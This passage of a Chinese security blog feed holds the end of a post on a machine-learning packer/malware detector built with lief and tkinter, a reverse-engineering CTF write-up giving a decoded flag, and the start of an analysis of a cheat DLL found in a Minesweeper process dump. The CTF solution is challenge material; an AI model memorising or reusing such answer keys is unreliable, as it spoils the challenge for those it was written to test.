filepath)</span><br><span class="line">    <span class="keyword">if</span> hasattr(filepath, <span class="string">'read'</span>):</span><br><span class="line">       <span class="built_in"> raw </span>= filepath.read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        with open(filepath, <span class="string">'rb'</span>) as fp:</span><br><span class="line">           <span class="built_in"> raw </span>= fp.read()</span><br><span class="line">    sz = len(raw) #读取文件大小</span><br><span class="line">    pe = lief.PE.parse(list(raw))   #lief工具</span><br><span class="line">    ep_bytes = [0] * 64 #存前64字节</span><br><span class="line">    try:</span><br><span class="line">        ep_offset = pe.entrypoint - pe.optional_header.imagebase    #靠工具计算出入口函数的位置(第一个函数)</span><br><span class="line">        ep_bytes = [int(b) <span class="keyword">for</span> b <span class="keyword">in</span> raw[ep_offset:ep_offset + 64]]</span><br><span class="line">    except Exception as e:</span><br><span class="line">        log.<span class="builtin-name">warning</span>(<span class="string">"can't get entrypoint bytes from %s: %s"</span>, filepath, e)</span><br><span class="line"></span><br><span class="line">    v = np.concatenate([ \</span><br><span class="line">        extract.encode_properties(pe),</span><br><span class="line">        extract.encode_entrypoint(ep_bytes),</span><br><span class="line">        extract.encode_histogram(raw),</span><br><span class="line">        extract.encode_libraries(pe),</span><br><span class="line">        [min(sz, pe.virtual_size) / max(sz, pe.virtual_size)],</span><br><span class="line">        extract.encode_sections(pe),</span><br><span class="line">    ])</span><br><span class="line">    return v</span><br></pre></td></tr></table></figure><h3 id="ui"><a href="#ui" class="headerlink" title="ui"></a>ui</h3><p>用<code>Python</code>自带的<code>tkinter</code>来写GUI.</p><p><strong>注意 修改text控件的时候, 要把初始化写成两行, 不能像代码里的label一样, 初始化和位置写在一行, 这样无法insert内容</strong></p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line">from tkinter <span class="built_in">import</span> *</span><br><span class="line"><span class="built_in">import</span> tkinter.filedialog</span><br><span class="line"><span class="built_in">import</span> lief</span><br><span class="line"><span class="built_in">import</span> PeInformation</span><br><span class="line"><span class="built_in">import</span> usage_model</span><br><span class="line"></span><br><span class="line">def SelectFile():</span><br><span class="line">    <span class="attr">path_</span> = tkinter.filedialog.askopenfilename()</span><br><span class="line">    path_in.set(path_)</span><br><span class="line"></span><br><span class="line">def LoadFile(filepath):</span><br><span class="line">    <span class="keyword">if</span> hasattr(filepath, 'read'):</span><br><span class="line">        <span class="attr">raw</span> = filepath.read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">with</span> open(filepath, 'rb') as fp:</span><br><span class="line">            <span class="attr">raw</span> = fp.read()</span><br><span class="line">    <span class="attr">pe</span> = lief.PE.parse(list(raw))  <span class="comment"># lief工具</span></span><br><span class="line">    return pe</span><br><span class="line"></span><br><span class="line">def Start():</span><br><span class="line">    EditText1.delete('<span class="number">1.0</span>', 'end')</span><br><span class="line">    EditText2.delete('<span class="number">1.0</span>', 'end')</span><br><span class="line">    EditText3.delete('<span class="number">1.0</span>', 'end')</span><br><span class="line">    EditText4.delete('<span class="number">1.0</span>', 'end')</span><br><span class="line">    EditText5.delete('<span class="number">1.0</span>', 'end')</span><br><span class="line">    EditText6.delete('<span class="number">1.0</span>', 'end')</span><br><span class="line">    EditText7.delete('<span class="number">1.0</span>', 'end')</span><br><span class="line">    <span class="attr">inroad</span> = path_in.get()</span><br><span class="line">    <span class="comment"># 输出文件信息</span></span><br><span class="line">    <span class="attr">pe</span> = LoadFile(inroad)</span><br><span class="line">    <span class="attr">infor_section</span> = PeInformation.Infor_Sections(pe)</span><br><span class="line">    <span class="attr">libraries</span> = PeInformation.Library(pe)</span><br><span class="line">    <span class="attr">imports</span> = PeInformation.Import(pe)</span><br><span class="line">    EditText1.insert(<span class="number">1.0</span>, infor_section[<span class="number">0</span>])</span><br><span class="line">    EditText2.insert(<span class="number">1.0</span>, infor_section[<span class="number">1</span>])</span><br><span class="line">    EditText3.insert(<span class="number">1.0</span>, infor_section[<span class="number">2</span>])</span><br><span class="line">    EditText4.insert(<span class="number">1.0</span>, infor_section[<span class="number">3</span>])</span><br><span class="line">    for i <span class="keyword">in</span> libraries:</span><br><span class="line">        EditText6.insert(<span class="string">"end"</span>, i+' ')</span><br><span class="line">    for i <span class="keyword">in</span> imports:</span><br><span class="line">        EditText7.insert(<span class="string">"end"</span>, i+' ')</span><br><span class="line">    <span class="attr">result=usage_model.Predict(inroad)</span></span><br><span class="line">    EditText5.insert(<span class="number">1.0</span>, result[<span class="number">0</span>])</span><br><span class="line">    <span class="comment">#print("Classify Result:",result[0])</span></span><br><span class="line"></span><br><span class="line"><span class="attr">root</span> = Tk()</span><br><span class="line">root.title(<span class="string">"基于机器学习的恶意软件侦壳系统"</span>)</span><br><span class="line"><span class="attr">path_in</span> = StringVar()</span><br><span class="line"><span class="attr">Label1=</span> Label(root,<span class="attr">text</span> = <span class="string">"EXE文件路径:"</span>).grid(<span class="attr">row</span> = <span class="number">0</span>, <span class="attr">column</span> = <span class="number">0</span>)</span><br><span class="line"><span class="attr">Label2=</span> Label(root,<span class="attr">text</span> = <span class="string">"区段数:"</span>).grid(<span class="attr">row</span> = <span class="number">1</span>, <span class="attr">column</span> = <span class="number">0</span>)</span><br><span class="line"><span class="attr">Label3=</span> Label(root,<span class="attr">text</span> = <span class="string">"标记为可执行的段:"</span>).grid(<span class="attr">row</span> = <span class="number">1</span>, <span class="attr">column</span> = <span class="number">2</span>)</span><br><span class="line"><span class="attr">Label4=</span> Label(root,<span class="attr">text</span> = <span class="string">"段的平均熵值:"</span>).grid(<span class="attr">row</span> = <span class="number">2</span>, <span class="attr">column</span> = <span class="number">0</span>)</span><br><span class="line"><span class="attr">Label5=</span> Label(root,<span class="attr">text</span> = <span class="string">"真实与虚拟大小比率:"</span>).grid(<span class="attr">row</span> = <span class="number">2</span>, <span class="attr">column</span> = <span class="number">2</span>)</span><br><span class="line"><span class="attr">Label7=</span> Label(root,<span class="attr">text</span> = <span class="string">"IAT里的DLL:"</span>).grid(<span class="attr">row</span> = <span class="number">3</span>, <span class="attr">column</span> = <span class="number">0</span>)</span><br><span class="line"><span class="attr">Label8=</span> Label(root,<span class="attr">text</span> = <span class="string">"IAT里的函数:"</span>).grid(<span class="attr">row</span> = <span class="number">4</span>, <span class="attr">column</span> = <span class="number">0</span>)</span><br><span class="line"><span class="attr">Label6=</span> Label(root,<span class="attr">text</span> = <span class="string">"检测结果:"</span>).grid(<span class="attr">row</span> = <span class="number">5</span>, <span class="attr">column</span> = <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="attr">Entry1=</span> Entry(root, <span class="attr">width=40,textvariable</span> = path_in).grid(<span class="attr">row</span> = <span class="number">0</span>, <span class="attr">column</span> = <span class="number">1</span>,<span class="attr">columnspan=2)</span></span><br><span class="line"></span><br><span class="line"><span class="attr">EditText1=</span> Text(root,<span class="attr">width=5,height=1)</span></span><br><span class="line">EditText1.grid(<span class="attr">row=1,column=1)</span></span><br><span class="line"><span class="attr">EditText2</span> = Text(root,<span class="attr">width=5,height=1)</span></span><br><span class="line">EditText2.grid(<span class="attr">row=1,column=3)</span></span><br><span class="line"><span class="attr">EditText3</span> = Text(root,<span class="attr">width=5,height=1)</span></span><br><span class="line">EditText3.grid(<span class="attr">row=2,column=1)</span></span><br><span class="line"><span class="attr">EditText4</span> = Text(root,<span class="attr">width=5,height=1)</span></span><br><span class="line">EditText4.grid(<span class="attr">row=2,column=3)</span></span><br><span class="line"><span class="attr">EditText5</span> = Text(root,<span class="attr">width=20,height=1)</span></span><br><span class="line">EditText5.grid(<span class="attr">row=5,column=1)</span></span><br><span class="line"></span><br><span class="line"><span class="attr">EditText6</span> = Text(root,<span class="attr">width=60,height=2)</span></span><br><span class="line">EditText6.grid(<span class="attr">row=3,column=1,columnspan=4)</span></span><br><span class="line"><span class="attr">EditText7</span> = Text(root,<span class="attr">width=60,height=2)</span></span><br><span class="line">EditText7.grid(<span class="attr">row=4,column=1,columnspan=4)</span></span><br><span class="line"></span><br><span class="line">Button(root, <span class="attr">text</span> = <span class="string">"Select"</span>, <span class="attr">command</span> = SelectFile).grid(<span class="attr">row</span> = <span class="number">0</span>, <span class="attr">column</span> = <span class="number">3</span>)</span><br><span class="line">Button(root, <span class="attr">text</span> = <span class="string">"Start"</span>, <span class="attr">command</span> = Start).grid(<span class="attr">row</span> = <span class="number">0</span>, <span class="attr">column</span> = <span class="number">4</span>)</span><br><span class="line">root.mainloop()</span><br></pre></td></tr></table></figure><h3 id="PeInformation-提供额外的PE信息"><a href="#PeInformation-提供额外的PE信息" class="headerlink" title="PeInformation 提供额外的PE信息"></a>PeInformation 提供额外的PE信息</h3><p>在ui里输出一些额外的信息,让这个程序看起来功能再强一点, 其实就是把extract里的内容改改输出</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Infor_Sections</span><span class="params">(pe)</span></span><span class="symbol">:</span></span><br><span class="line">    sections = [&#123; \</span><br><span class="line">                    <span class="string">'characteristics'</span>: <span class="string">','</span>.join(map(str, s.characteristics_lists)),</span><br><span class="line">                    <span class="string">'entropy'</span>: s.entropy,</span><br><span class="line">                    <span class="string">'size'</span>: s.size,</span><br><span class="line">                    <span class="string">'vsize'</span>: s.virtual_size&#125; <span class="keyword">for</span> s <span class="keyword">in</span> pe.sections]</span><br><span class="line">    num_sections = len(sections)</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="comment"># section_number 区段数</span></span><br><span class="line">        len(sections),</span><br><span class="line">        <span class="comment"># pec_sections_ratio    lief.PE.SECTION_CHARACTERISTICS.MEM_EXECUTE 可执行节的个数</span></span><br><span class="line">        (len([s <span class="keyword">for</span> s <span class="keyword">in</span> sections <span class="keyword">if</span><span class="string">'SECTION_CHARACTERISTICS.MEM_EXECUTE'</span> <span class="keyword">in</span> s[<span class="string">'characteristics'</span>]])),</span><br><span class="line">        <span class="comment"># sections_avg_entropy  节的平均熵</span></span><br><span class="line">        ((sum([s[<span class="string">'entropy'</span>] <span class="keyword">for</span> s <span class="keyword">in</span> sections]) / num_sections)),</span><br><span class="line">        <span class="comment"># sections_vsize_avg_ratio  大小与其虚拟大小的平均比率</span></span><br><span class="line">        ((sum([s[<span class="string">'size'</span>] / s[<span class="string">'vsize'</span>] <span class="keyword">for</span> s <span class="keyword">in</span> sections]) / num_sections)),</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line"><span class="comment"># IAT内的libraries 和 imports</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Library</span><span class="params">(pe)</span></span><span class="symbol">:</span></span><br><span class="line">    libraries = [l.lower() <span class="keyword">for</span> l <span class="keyword">in</span> pe.libraries]</span><br><span class="line">    <span class="keyword">return</span> libraries</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Import</span><span class="params">(pe)</span></span><span class="symbol">:</span></span><br><span class="line">    imports = [lib.name.lower() + <span class="string">':'</span> + e.name <span class="keyword">for</span> lib <span class="keyword">in</span> pe.imports <span class="keyword">for</span> e <span class="keyword">in</span> lib.entries]</span><br><span class="line">    <span class="keyword">return</span> imports</span><br><span class="line"></span><br><span class="line">    <span class="comment">#包含代码的段的数量与包含数据的段的数量，标记为可执行的段，每个段的平均熵值，大小与其虚拟大小的平均比率</span></span><br></pre></td></tr></table></figure><h2 id="Pyinstaller-的使用-属实拉胯"><a href="#Pyinstaller-的使用-属实拉胯" class="headerlink" title="Pyinstaller 的使用(属实拉胯)"></a>Pyinstaller 的使用(属实拉胯)</h2><p>用于py文件转exe 还必须在windows里用, 拉胯拉胯</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pip install Pyinstaller</span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">### 使用</span><br><span class="line">把要打包的py放在一个目录下, 执行</span><br></pre></td></tr></table></figure><p>pyinstaller -F -i image.ico -c ui.py -w<br><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">即可, 记得这代码未能把模型`rfc.model` 打包进行, 要手动移到同个目录才能正常使用侦壳功能.</span><br></pre></td></tr></table></figure></p><p>-F 打包成一个文件<br>-c 指定 main 脚本<br>-i 指定图标<br>-w 去掉打开时伴随的命令行窗口<br><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 排雷</span><br><span class="line">按照上述操作 并不能成功得到能用来侦壳的 `exe` 文件, 因为`pyinstall`忘记导入 和`sklearn` 包相关的库了. 需要额外导入</span><br></pre></td></tr></table></figure></p><p>pyinstaller -F –hidden-import=”sklearn.utils._cython_blas” –hidden-import=”sklearn.neighbors.typedefs” –hidden-import=”sklearn.neighbors.quad_tree” –hidden-import=”sklearn.tree._utils” Datamanager.py<br><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">或者在第一次打包后生成的`ui.spec`文件里添加需要hidden import的libraries.</span><br></pre></td></tr></table></figure></p><h1 id="mode-python-coding-utf-8"><a href="#mode-python-coding-utf-8" class="headerlink" title="-- mode: python ; coding: utf-8 --"></a>-<em>- mode: python ; coding: utf-8 -</em>-</h1><p>block_cipher = None</p><p>a = Analysis([‘C:\Users\Danganronpa\Desktop\competition code\ui.py’],<br>             pathex=[‘C:\Users\Danganronpa\Desktop\competition code’],<br>             binaries=[],<br>             datas=[],<br>             hiddenimports=[“sklearn.ensemble”,”sklearn.utils._cython_blas”,”sklearn.neighbors.typedefs”,”sklearn.neighbors.quad_tree”,”sklearn.tree._utils”],<br>             hookspath=[],<br>             runtime_hooks=[],<br>             excludes=[],<br>             win_no_prefer_redirects=False,<br>             win_private_assemblies=False,<br>             cipher=block_cipher,<br>             noarchive=False)<br>pyz = PYZ(a.pure, a.zipped_data,<br>             cipher=block_cipher)<br>exe = EXE(pyz,<br>          a.scripts,<br>          a.binaries,<br>          a.zipfiles,<br>          a.datas,<br>          [],<br>          name=’ui’,<br>          debug=False,<br>          bootloader_ignore_signals=False,<br>          strip=False,<br>          upx=True,<br>          upx_exclude=[],<br>          runtime_tmpdir=None,<br>          console=False , icon=’C:\Users\Danganronpa\Desktop\favicon.ico’)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">修改完之后执行命令</span><br></pre></td></tr></table></figure></p><p>pyinstaller ui.spec<br><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## 总结+排雷</span><br><span class="line">毕设很辛苦, 到处找能参考的资料和代码, 到处找能用的工具, 找到现成的模块也要不断地调试, 处理报错. 在此感谢`stackoverflow`这个超级牛逼的论坛. 非常有用</span><br><span class="line"></span><br><span class="line"><span class="title">* import的版本问题:</span> 例如sklearn的版本 我mac上的老版本 <span class="number">0.20</span>.<span class="number">0</span>里. 是用`from sklearn.externals import joblib`来导包, 使用模型. 但在新的版本里 <span class="number">0.22</span>.<span class="number">0</span>. 这个抛弃了, 直接`import joblib`就行. 所以请list查看版本, 安装指定版本</span><br></pre></td></tr></table></figure></p><p>pip list<br>pip uninstall scikit-learn<br>pip install scikit-learn==0.20.0<br><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* 用Python自带的tkinter来写GUI, 修改text控件的时候, 要把初始化写成两行, 不能像代码里的label一样, 初始化和位置写在一行, 这样无法`insert`内容</span><br></pre></td></tr></table></figure></p><p>EditText6 = Text(root,width=60,height=2)<br>EditText6.grid(row=3,column=1,columnspan=4)<br><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* 注意写入csv的格式, 用`\n`隔开</span><br></pre></td></tr></table></figure></p><p>files=open(‘/Volumes/Samsung_T5/malware samples/data/data-2000.csv’,’w’,newline=’’)<br>writer=csv.writer(files, lineterminator=’\n’)   #防止默认输出’\r\n’<br>for line in lines:<br>    writer.writerow(line) #写入一行<br><code>`</code></p><h1 id="看了别的论文之后的想法"><a href="#看了别的论文之后的想法" class="headerlink" title="看了别的论文之后的想法"></a>看了别的论文之后的想法</h1><h2 id="数据特征降维度"><a href="#数据特征降维度" class="headerlink" title="数据特征降维度"></a>数据特征降维度</h2><p>在特征提取的时候我一直心心念念前64字节这个特征, 也就是OEP特征. 我认为可以在侦壳这块有很好的发挥,但事实上效果不好. 可能是因为64个字节特征是不连贯的, 各管各的. </p><p>所以我觉得可以把N-gram这个用在这里, 统计OEP的语义特征.</p><p>同时考虑到用N-gram会出现很多组特征(因为n*n维度,同时64字节的长度不算短), 可以使用聚类算法降维度, 即出现了某种划分组合，一定会出现另一种或几种组合，这个时候这几个划分组合的概率会十分相似，可以将其归为同一维，用同一个概率来表示原来这几个划分各自不同的概率.</p><p>计算机先将原n×n个子划分序列随机分为k组，随后不停的调整其中的子序列所在的组，直到每一组的概率损失最小为止。</p><h2 id="框架设计"><a href="#框架设计" class="headerlink" title="框架设计"></a>框架设计</h2><p>原方案是利用tkinter编写GUI界面, 但很低级, 个人更希望是想呈现一个 类似命令行交互的界面, 方便使用, 同时不限制使用环境.(有Python就能用)</p><p>看大创的报告, View使用了交互式Python shell工具prompt-toolkit，它可以产生一个类似IDE的支持自动补全的命令行环境，便于用户操作；Model使用scikit-learn实现核心的机器学习算法</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;毕设+作品赛 垃圾比赛还要求提交可执行程序 我觉得是在歧视脚本(扒拉出以前写过的tkinter 和调了一万年的pyinstaller 属实拉胯 库都不导入全)&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
    <category term="Machine Learning" scheme="http://Ronpa.top/tags/Machine-Learning/"/>
    
  </entry>
  
  <entry>
    <title>2020网鼎杯朱雀组</title>
    <link href="http://ronpa.top/2020/05/17/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E6%9C%B1%E9%9B%80%E7%BB%84/"/>
    <id>http://ronpa.top/2020/05/17/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E6%9C%B1%E9%9B%80%E7%BB%84/</id>
    <published>2020-05-17T09:58:52.000Z</published>
    <updated>2021-01-25T19:17:34.050Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>打着玩儿 比较无脑</p></blockquote><a id="more"></a><p>跟进主函数,大致流程是把输入的flag转成四位的二进制,然后经过加密变化最后和硬编码做对比.<br><img src="/2020/05/17/2020网鼎杯朱雀组/1-2.png" alt><br>比较函数,和<code>ybjfjgnfcshjvfkk</code>对比:<br><img src="/2020/05/17/2020网鼎杯朱雀组/1-3.png" alt><br><code>glockflag</code>是关键的内置的二叉树,根据输入的二进制最后得到编码</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">do</span><br><span class="line">  &#123;</span><br><span class="line">   <span class="built_in"> if </span>( glockflag[v5] == '0' )                 </span><br><span class="line">    &#123;</span><br><span class="line">      v3 = *(v3 + 0xC);</span><br><span class="line">    &#125;</span><br><span class="line">    else<span class="built_in"> if </span>( glockflag[v5] == '1' )           </span><br><span class="line">    &#123;</span><br><span class="line">      v3 = *(v3 + 0x10);</span><br><span class="line">    &#125;</span><br><span class="line">    ++v5;</span><br><span class="line">   <span class="built_in"> if </span>( *v3 &gt; 96 &amp;&amp; *v3 &lt;= 122 )</span><br><span class="line">    &#123;</span><br><span class="line">      Str2[v4++] = *v3;</span><br><span class="line">      v3 = a1;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>动态调试就能得到树的结构,最后共26个叶,对应26个字母.</p><p>对应关系:</p><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">'z</span><span class="symbol">':</span> <span class="symbol">'1010</span>'</span><br><span class="line"><span class="symbol">'v</span><span class="symbol">':</span> <span class="symbol">'1111</span>'</span><br><span class="line"><span class="symbol">'j</span><span class="symbol">':</span> <span class="symbol">'010</span>'</span><br><span class="line"><span class="symbol">'y</span><span class="symbol">':</span> <span class="symbol">'0000</span>'</span><br><span class="line"><span class="symbol">'o</span><span class="symbol">':</span> <span class="symbol">'11100</span>'</span><br><span class="line"><span class="symbol">'s</span><span class="symbol">':</span> <span class="symbol">'100</span>'</span><br><span class="line"><span class="symbol">'g</span><span class="symbol">':</span> <span class="symbol">'0010</span>'</span><br><span class="line"><span class="symbol">'n</span><span class="symbol">':</span> <span class="symbol">'1011</span>'</span><br><span class="line"><span class="symbol">'k</span><span class="symbol">':</span> <span class="symbol">'01111</span>'</span><br><span class="line"><span class="symbol">'b</span><span class="symbol">':</span> <span class="symbol">'00010</span>'</span><br><span class="line"><span class="symbol">'p</span><span class="symbol">':</span> <span class="symbol">'01101</span>'</span><br><span class="line"><span class="symbol">'d</span><span class="symbol">':</span> <span class="symbol">'0111010</span>'</span><br><span class="line"><span class="symbol">'m</span><span class="symbol">':</span> <span class="symbol">'111011</span>'</span><br><span class="line"><span class="symbol">'x</span><span class="symbol">':</span> <span class="symbol">'011100</span>'</span><br></pre></td></tr></table></figure><p>得到最后的flag转成的二进制序列<br>10101111101001000001111111001000010101110100111100010010010010000001101010000100100111010111111101110001001000001111100010011100</p><p>转成最后的flag <code>flag{afa41fc8-574f-1248-1a84-9d7f7120f89c}</code><br><img src="/2020/05/17/2020网鼎杯朱雀组/1-4.png" alt></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;打着玩儿 比较无脑&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
    <category term="Writeup" scheme="http://Ronpa.top/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>2020腾讯游戏安全竞赛决赛PC方向分析</title>
    <link href="http://ronpa.top/2020/04/24/2020%E8%85%BE%E8%AE%AF%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%86%B3%E8%B5%9BPC%E6%96%B9%E5%90%91%E5%88%86%E6%9E%90/"/>
    <id>http://ronpa.top/2020/04/24/2020%E8%85%BE%E8%AE%AF%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%86%B3%E8%B5%9BPC%E6%96%B9%E5%90%91%E5%88%86%E6%9E%90/</id>
    <published>2020-04-24T20:34:13.000Z</published>
    <updated>2021-02-17T21:51:36.907Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>毕设摸鱼 emmmmm试一试能不能把决赛的ring3给做了 ring0放弃 驱动不会</p></blockquote><a id="more"></a><h2 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h2><p>winmine.exe是一个扫雷游戏程序，winmine.dmp是该程序的一份进程dump, 在这份dump中，有一个DLL作弊程序。</p><ol><li>请找到该作弊程序，给出模块名；（1分）</li><li>并分析它所包含的4个作弊功能，给出实现作弊功能的函数的偏移，并说明其作弊功能是什么。（4分）</li></ol><p><a href="https://bbs.pediy.com/thread-258803.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-258803.htm</a><br><a href="https://www.52pojie.cn/thread-1155772-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-1155772-1-1.html</a><br><a href="https://bbs.pediy.com/thread-258801.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-258801.htm</a></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>和上一题一样差不多, 但这次不是直接修改程序, 而是添加了一个dll, 方法估计也是直接从dump文件里提取外挂dll. 然后分析调用的函数.</p><h2 id="overview-of-cheat-module"><a href="#overview-of-cheat-module" class="headerlink" title="overview of cheat module"></a>overview of cheat module</h2><p>用windbg打开dump文件, <code>lm</code>展开查看已经加载的模块<img src="/2020/04/24/2020腾讯游戏安全竞赛决赛PC方向分析/1-1.png" alt><br>第四个从名字看就很有问题<code>CheatTools</code>, 查看模块信息,一看就不是什么正经模块233333</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">:004&gt;</span> <span class="string">lmDvmCheatTools</span></span><br><span class="line"><span class="string">Browse</span> <span class="string">full</span> <span class="string">module</span> <span class="string">list</span></span><br><span class="line"><span class="string">start</span>    <span class="string">end</span>        <span class="string">module</span> <span class="string">name</span></span><br><span class="line"><span class="number">6e220000</span> <span class="number">6e266000</span>   <span class="string">CheatTools</span>   <span class="string">(deferred)</span>             </span><br><span class="line">    <span class="attr">Image path:</span> <span class="string">D:\Temp\bin\CheatTools.dll</span></span><br><span class="line">    <span class="attr">Image name:</span> <span class="string">CheatTools.dll</span></span><br><span class="line">    <span class="string">Browse</span> <span class="string">all</span> <span class="string">global</span> <span class="string">symbols</span>  <span class="string">functions</span>  <span class="string">data</span></span><br><span class="line">    <span class="attr">Timestamp:</span>        <span class="string">Sun</span> <span class="string">Apr</span> <span class="number">23</span> <span class="number">14</span><span class="string">:46:00</span> <span class="number">2017</span> <span class="string">(58FC4DA8)</span></span><br><span class="line">    <span class="attr">CheckSum:</span>         <span class="number">00045158</span></span><br><span class="line">    <span class="attr">ImageSize:</span>        <span class="number">00046000</span></span><br><span class="line">    <span class="attr">File version:</span>     <span class="number">1.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">    <span class="attr">Product version:</span>  <span class="number">1.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">    <span class="attr">File flags:</span>       <span class="number">0</span> 